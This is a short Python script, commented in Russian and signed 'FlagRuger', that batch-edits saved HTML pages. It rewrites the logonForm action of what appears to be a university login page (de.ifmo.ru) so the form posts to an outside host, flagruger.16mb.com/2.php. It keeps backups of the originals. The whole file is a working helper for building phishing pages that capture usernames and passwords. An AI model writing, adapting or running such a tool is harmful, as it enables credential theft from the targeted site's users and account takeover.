# -*- coding: UTF-8 -*-

# by FlagRuger

from os import listdir
import os
import time
import re

# Настройки
dirname = "!new"  	#папка с новыми файлами 
backupdir = "!old"	#папка с бекапом файлов
format = ".html"	#какие документы изменяем
old = "id=\"logonForm\" action=\"https://de.ifmo.ru/servlet/\""        #что меняем   (не забываем про экранирование кавычек обратным слешем)
new = "id=\"logonForm2\" action=\"http://flagruger.16mb.com/2.php/\""  #на что меняем  (при необходимости можно прогнать несколько раз)

print("\n[!] Старт\n")

curdir = os.path.abspath(os.curdir)

if not os.path.exists(dirname):
	os.mkdir(dirname)

if not os.path.exists(backupdir):
	os.mkdir(backupdir)
	
dirr = curdir + "\\" + dirname + "\\"
backupdir = curdir + "\\" + backupdir + "\\"

files = listdir(".")
mytxt = filter(lambda x: x.endswith(format), files)

for i in mytxt:
	print(" [+] " + i)
	output_file = open(dirr + i, "w")
	output_file_backup = open(backupdir + i, "w")
	data = open(i).read()
	output_file_backup.write(data)
	output_file.write( re.sub(old, new, data)  )
	output_file.close()
	output_file_backup.close()
   
print("\n[!] Готово\n")